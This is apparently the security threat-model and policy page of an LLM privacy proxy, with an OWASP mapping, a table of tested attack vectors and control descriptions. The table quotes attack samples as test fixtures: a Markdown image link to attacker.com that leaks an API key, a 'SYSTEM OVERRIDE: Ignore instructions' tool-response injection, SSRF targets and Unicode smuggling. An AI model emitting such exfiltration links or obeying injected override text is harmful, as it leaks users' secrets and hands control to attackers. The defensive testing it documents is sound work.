[⬅️ Back to README](/)

# Security Threat Model and Controls


## OWASP Top 10 for LLMs mapping

The following table maps implemented controls to selected OWASP risks. It is a design aid, not a claim that the proxy fully mitigates an OWASP category or secures the surrounding application, model, supply chain, and deployment.

| OWASP Threat | LLM-Shield-Proxy Mitigation |
| :--- | :--- |
| **LLM01: Prompt Injection** | A configured pattern can neutralize selected instruction-like text in supported tool content. It is not a general prompt-injection defense. |
| **LLM02: Insecure Output Handling** | The proxy limits selected JSON/SSE shapes and neutralizes a tested Markdown image case. Applications must still validate and encode model output before use. |
| **LLM04: Model Denial of Service** | Buffer, line, depth, token, and request limits reduce selected resource-exhaustion risks. They do not guarantee availability. |
| **LLM05: Supply Chain Vulnerabilities** | Release workflows publish signed container provenance and SBOM attestations. Operators must verify them and still assess dependencies, build systems, registries, and deployment policy. |
| **LLM06: Sensitive Information Disclosure** | The detector tiers can transform recognized values on supported paths. Coverage depends on patterns, model, corpus, configuration, and routing. |
| **LLM07: Insecure Plugin Design** | JWT/DPoP validation and policy checks can restrict supported tool calls. Tool design and every other route require separate review. |
| **LLM08: Excessive Agency** | The limited MCP route can apply tool allow/deny policy. The loop breaker stops one repeated-request pattern after a threshold. |
| **LLM10: Model Theft** | A research-only zero-width marker can provide a correlation signal if it survives. It neither prevents model theft nor proves attribution. |

## 22-Vector Threat Matrix
The repository includes automated unit, integration, conformance, and adversarial tests for the mechanisms listed below. A passing repository test demonstrates the named fixture at the tested revision; it is not a deployment-wide security validation.

| Threat Vector / Attack Category | Adversarial Payload / Vector | Proxy Defense Mechanism | Verification Status |
| :--- | :--- | :--- | :--- |
| **Streaming Packet Splitting** | 1-character token fragmentation across SSE deltas (`"["`, `"E"`, `"M"`, `"A"`, `"I"`, `"L"`, `"_1]"`). | Sliding-window prefix-overlap retention holding incomplete tokens across packets. | ✅ **PASSED** (`test_extreme_chunk_splitting_sse_evasion`) |
| **Early Stream Termination** | Client aborts or upstream disconnects mid-stream. | Deterministic `finally` buffer flush + upstream connection teardown. | ✅ **PASSED** (`test_rehydrate_sse_stream_generator`) |
| **Unicode Smuggling** | Zero-width spaces (`j​ohn@doe.com`, `555​-44-3333`). | `normalize_and_desmuggle()` removes invisible format characters + NFKC normalization. | ✅ **PASSED** (`test_unicode_zero_width_smuggling`) |
| **BiDi / RTL Override Evasion** | Right-to-Left Override (`‮3333-44-555`). | Directional format controls (`‪-‮`, `⁠-⁩`) stripped before regex matching. | ✅ **PASSED** (`test_bidi_rtl_override_smuggling`) |
| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Bounded inspection for text-sized values. For candidates over 8,192 characters, encoded interiors are skipped and 256-character boundary guards preserve adjacent plaintext detection. Image payloads are not decoded. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`, `test_dlp_redos_base64_obfuscation`, `test_oversized_base64_keeps_plaintext_boundary_detection`) |
| **Markdown Image Exfiltration** | Prompt tricks LLM into outputting `![logo](https://attacker.com/leak?data=[API_KEY])`. | Outbound image sanitizer in `vault.rehydrate()` neutralizes query parameter leak URLs. | ✅ **PASSED** (`test_markdown_image_exfiltration_blocking`) |
| **Tool Response Poisoning** | Malicious API/web results containing `"SYSTEM OVERRIDE: Ignore instructions"`. | `INDIRECT_PROMPT_INJECTION_PATTERN` neutralizes override tokens in `role: "tool"` content. | ✅ **PASSED** (`test_tool_response_indirect_prompt_injection_neutralization`) |
| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
| **Slowloris Memory Ballooning** | Long non-terminating streams attempting to exhaust RAM. | Bounded `64KB` buffer guard + `1MB` SSE line limit. | ✅ **PASSED** (`test_slowloris_buffer_backpressure_limit`) |
| **CJK Sub-Word Collisions** | Continuous Chinese/Japanese text (`我的名字是Maya。`). | Script-aware boundary isolation allowing logographic replacements without whitespace. | ✅ **PASSED** (`test_cjk_multilingual_boundary_safety`) |
| **Multi-Modal Content Arrays** | Multi-part vision message arrays with text and base64 images. | Universal content block unwrapping redacting text without altering image payloads. | ✅ **PASSED** (`test_multimodal_content_array_redaction`) |
| **Timing Attacks on API Keys** | Key length and character leakage via string comparison timing. | Constant-time authentication verification using `hmac.compare_digest()`. | ✅ **PASSED** (`test_inbound_auth_validation`) |
| **SSRF & Network Boundary** | Requests targeting `127.0.0.1`, AWS metadata (`169.254.169.254`), or private LANs. | Dynamic DNS resolution + IP blacklist rejecting loopback, link-local, and multicast IPs. | ✅ **PASSED** (`test_ssrf_rejection`) |
| **Repeated Agent Requests** | A client repeats the same request until it consumes excessive time or provider budget. | Session-scoped duplicate-request threshold (`AGENT_BREAKER_THRESHOLD`). | ✅ **PASSED** (`test_composite_agent_loop_breaker`) |
| **Audit Log Tampering** | Malicious actor modifies supplied evidence. | SHA-256 chaining, Ed25519 signatures, sequence checks, and optional durable delivery. | ✅ **PASSED** (`test_worm_compliant_merkle_chaining`); immutable retention is external |
| **Copied Marked Output** | Output carrying a configured zero-width marker is copied elsewhere. | Marker decoding can correlate surviving marker bits with retained metadata; it does not prevent copying or prove attribution. | ✅ **PASSED** (`test_dynamic_canary_watermark_injection`) |
| **Receipt Tampering** | An application-generated stream receipt is edited after emission. | HMAC-signed rolling SSE digest metadata; this does not observe every network packet. | ✅ **PASSED** (`test_stream_digest_receipt_log_and_signature`) |
| **Mapping-Store Disclosure** | An attacker reads a Redis or in-memory token mapping store. | Stateless crypto mode avoids that external mapping for supported flows. Plaintext still exists in process memory during transformation. | ✅ **PASSED** (`test_stateless_synthetic_masking_vault_bypass`) |
| **DPoP Proof Replay** | Eavesdropper captures a valid `(JWT, DPoP)` pair and replays it inside its freshness window. | RFC 9449 `(jkt, jti)` replay cache (`TTLCache`, 300s TTL); a reused pair is rejected with `401 "DPoP proof replayed"` even though the proof is otherwise cryptographically valid. | ✅ **PASSED** (`test_dpop_replay_rejected_on_reuse`) |
| **Unauthenticated BYOK Passthrough** | Caller presents a provider-shaped key (`sk-proj-*`) that matches no configured virtual key, hoping prefix-matching alone grants passthrough. | `ENABLE_OPEN_BYOK_PASSTHROUGH` (default `False`) gates the bypass; without it the request is rejected `401` before ever reaching the DLP pipeline. | ✅ **PASSED** (`test_byok_prefix_alone_rejected_by_default`) |
| **Permissive CORS Origin Reflection** | Browser-based cross-origin request from an origin not on any allowlist. | `CORS_ALLOWED_ORIGINS` unset/empty now denies (`Access-Control-Allow-Origin: null`) by default instead of reflecting the caller's `Origin` or falling back to `*`. | ✅ **PASSED** (`test_cors_preflight_strict_default_denies_reflection`) |
| **TLS Cert Validation Bypass on IP-Pinned SSRF Defense** | Dynamic HTTPS upstream override (`X-Upstream-Base-Url`) resolved and pinned to a validated IP for DNS-rebinding safety. | The original FQDN is preserved as the TLS SNI/certificate-verification hostname (`extensions={"sni_hostname": ...}`) even though the socket connects to the pinned IP -- so cert validation still succeeds against the real domain instead of failing (or requiring `INSECURE_SKIP_VERIFY`). | ✅ **PASSED** (`test_dynamic_upstream_override_pins_ip_but_preserves_sni`) |

## Control details

### Masking and detection

#### Data Loss Prevention (DLP) for LLMs (Synthetic Masking & Entropy)
* **Implementation details**: Tier 2 calculates Shannon entropy
  (`H(S) = -Σ p(c) log2 p(c)`) for selected Base64- and hexadecimal-shaped candidates. Values
  above configured thresholds are handled by the selected masking mode. Entropy is a heuristic:
  it can miss secrets and flag benign data. Synthetic substitutes can also change tokenization and
  model behavior.
* **Flags**: [`ENABLE_TIER2_ENTROPY`](deployment.md#core-configuration-flags), [`ENABLE_SYNTHETIC_SWAPPING`](deployment.md#core-configuration-flags)

#### In-band stateless cryptographic masking
* **Implementation Details**: Avoids an external mapping vault for supported flows by encrypting detected values into in-band tokens with **AES-256-GCM**. Security depends on key generation, custody, rotation, nonce handling, implementation correctness, and the selected threat model. Ciphertext still crosses the configured upstream boundary, and provider echo must be tested.
* **Flags**: [`SHIELD_DEFAULT_MASKING_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`SHIELD_ENCRYPTION_KEY`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Redis TTL mapping store
* **Implementation details**: The Redis mode stores rehydration mappings as plaintext JSON under
  HMAC-derived keys with a TTL. It lets replicas use shared mappings but does not keep the original
  values out of process memory, Redis memory, persistence files, replicas, or backups.
* **Flags**: [`REDIS_URL`](deployment.md#core-configuration-flags), [`SESSION_TTL_SECONDS`](deployment.md#core-configuration-flags)

#### Zero-width correlation marker
* **Implementation Details**: Can insert a keyed zero-width correlation marker into configured output. If enough of the marker survives copying and normalization, the decoder can associate it with recorded metadata. The signal is removable, can collide with text-processing behavior, and does not by itself prove who disclosed content.
* **Flags**: [`ENABLE_WATERMARKING`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`SHIELD_WATERMARK_SECRET`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

### Request and identity controls

#### Agent identity enforcer
* **Implementation details**: On supported paths, requires a signed workload JWT and a
  Demonstrating Proof-of-Possession (DPoP) proof. The proxy records validated identity metadata in
  its audit chain. Issuer trust, authorization, replay behavior across replicas, and key custody
  remain deployment responsibilities. See the [identity documentation](/docs/features/agent_identity_enforcer.md).
* **Flags**: [`AGENT_IDENTITY_ENFORCER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Agent loop circuit breaker
* **Implementation details**: The breaker tracks configured request and tool-call signals for a
  session. It returns HTTP 429 after the duplicate threshold. It can miss changing loops and flag
  legitimate repetition; it does not prevent every agent denial-of-service or cost event.
* **Flags**: [`ENABLE_AGENT_BREAKER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`AGENT_BREAKER_THRESHOLD`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Entity policy scopes and default-deny behavior
* **Implementation Details**: Binds supported requests to configured profiles through Virtual Keys. The redaction failure mode defaults to `FAIL_CLOSED`; each policy resolver and dependency still requires explicit failure-path testing. The MCP router denies every tool when its resolver returns an empty allowlist unless the operator explicitly selects `MCP_EMPTY_ALLOWLIST_MODE=BLOCKLIST_ONLY`, which emits a critical startup warning.
* **Flags**: [`VALID_VIRTUAL_KEYS`](deployment.md#core-configuration-flags), [`SHIELD_FAILURE_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Bounded Streaming JSON Lexer
* **Implementation Details**: Limits retained parser state and SSE line size. Validate peak RSS with the published service-level protocol; the project does not claim a universal process-memory ceiling.
* **Flags**: [`MAX_SSE_LINE_LENGTH`](deployment.md#core-configuration-flags)

### Audit and evidence

#### Tamper-Evident Cryptographic Attestation & Audit Logging
* **Implementation Details**: Emits privacy-safe structured events containing timestamps, tenant IDs, entity categories, and session metadata. Records are signed and hash-linked. The default is a process-local best-effort chain; local durable JSONL is opt-in and is not WORM storage. Raw-PII boundary behavior is tested separately by the conformance harness.
* **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Cryptographic SHA-256 Hash Chaining
* **Implementation details**: Every emitted audit entry can be signed and linked to the previous
  hash. Verification detects edits, gaps, insertion, or reordering in the evidence it receives. It
  cannot detect an unanchored deleted suffix. These records may support an assessment; they do not
  satisfy SOC 2, ISO/IEC 42001, or HIPAA requirements by themselves.
* **Flags**: [`AUDIT_LOG_FORMAT`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Signed Egress Transformation Receipt
* **Implementation Details**: Signs application-generated transformation metadata so a verifier can detect later modification of the supplied receipt. It supports review of what the application recorded at the configured boundary; it does not independently observe the network, prove universal detector recall, or rule out another egress path.

#### FIPS 140-3 KAT & RFC 6902 Differential Audit Logging
* **Implementation details**: Runs fixed SHA-256 and AES-256-GCM known-answer tests at startup.
  These tests do not validate the cryptographic module under FIPS 140-3. Supported audit paths can
  also record RFC 6902 mutation metadata; the format alone does not prove the record is complete.
* **Flags**: [`FIPS_STRICT_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`AUDIT_LOG_FORMAT`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

### Infrastructure and service mesh

#### Vault secrets and mTLS
* **Implementation details**: Supports HashiCorp Vault authentication through AppRole, Kubernetes
  service-account tokens, or a Vault token. TLS settings can require inbound client certificates
  and configure outbound trust or client certificates. These options require explicit
  configuration and do not replace certificate identity mapping, authorization, rotation,
  revocation, or key custody. See the
  [TLS and mTLS documentation](/docs/features/secure-infrastructure-service-mesh/tls-mtls-support.md).
* **Flags**: [`ENABLE_VAULT_SECRETS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`ENABLE_MTLS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), `TLS_CERT_FILE`, `CLIENT_CA_FILE`, `OUTBOUND_CLIENT_CERT`.

#### Envoy gRPC ext_proc integration
* **Implementation Details**: Implements Envoy's External Processing interface (`envoy.service.ext_proc.v3.ExternalProcessor`) and supports a Unix Domain Socket between sidecars. This removes a TCP hop between Envoy and the processor but still incurs serialization, IPC, parsing, and transformation work that must be measured.
* **Flags**: [`ENABLE_EXT_PROC`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`EXT_PROC_SOCK_PATH`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Kubernetes Mutating Webhook
* **Implementation details:** A standalone Kubernetes mutating webhook can add configured sidecar and certificate references to matching Pod admissions. It requires admission registration, TLS, service/RBAC configuration, and cluster privileges appropriate to those resources.

#### Traffic controls and resilience
* **Implementation Details**:
  * **Redis token bucket**: A Lua operation applies configured request limits using shared Redis
    state. Redis failure behavior and capacity require deployment tests.
  * **SIGTERM Draining**: Gives active SSE streams up to the configured timeout to finish before process termination; streams can still be interrupted when the timeout expires.
  * **Upstream key selection**: On supported paths, replaces client provider credentials with the
    configured upstream credential.
* **Flags**: [`ENABLE_RATE_LIMITING`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`DRAIN_TIMEOUT_SECONDS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`OVERRIDE_CLIENT_AUTH`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Component health probes and Prometheus alerts
* **Implementation Details**: Provides `/healthz`, `/livez`, and `/readyz` signals for configured dependencies. Orchestrators must use the correct probe and thresholds; a healthy probe does not establish that a node is uncompromised.
* **Flags**: [`METRICS_BEARER_TOKEN`](deployment.md#core-configuration-flags)

#### Bounded Asynchronous OpenTelemetry (OTel) Tracing
* **Implementation Details**: Handles W3C `traceparent` propagation through a bounded asynchronous background path. Export configuration can still add CPU work, queue pressure, or drops and should be included in service-level tests.
* **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

#### Multi-Provider Translators & Anthropic Adapter
* **Implementation details:** The proxy transforms supported OpenAI-style requests and selected Anthropic SSE events on traffic explicitly routed through it. Network controls must prevent bypass, and provider-specific fields require integration tests.
* **Flags**: [`DEFAULT_UPSTREAM_PROVIDER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`ANTHROPIC_API_VERSION`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)

---

# Security Policy and Vulnerability Reporting

## Security Overview
LLM-Shield-Proxy is engineered to support in-VPC privacy controls and SOC 2/HIPAA evidence collection. Security and confidentiality are core to the architecture; deployment and operation determine compliance.

## Supported Versions
The project currently publishes security fixes for the latest release line only.

Backports to older versions are not part of the current maintenance policy. Operators should monitor release and advisory channels, pin and verify artifacts, and plan upgrades when a relevant fix is published.

| Version | Supported          |
| ------- | ------------------ |
| Latest  | :white_check_mark: |
| Older Versions | :x:         |

## Reporting a Vulnerability

If you discover a security vulnerability in LLM-Shield-Proxy, please **do not** open a public issue.

Instead, confidentially report the issue directly to the core maintainer:

- **Contact:** Ninad Phalak
- **Email:** `ninad.phalak@gmail.com`

Please include in your report:
- A detailed description of the vulnerability.
- Steps to reproduce or proof-of-concept payload/code.
- Impact assessment.

We aim to respond to security reports within 24-48 hours and release a patch expeditiously.
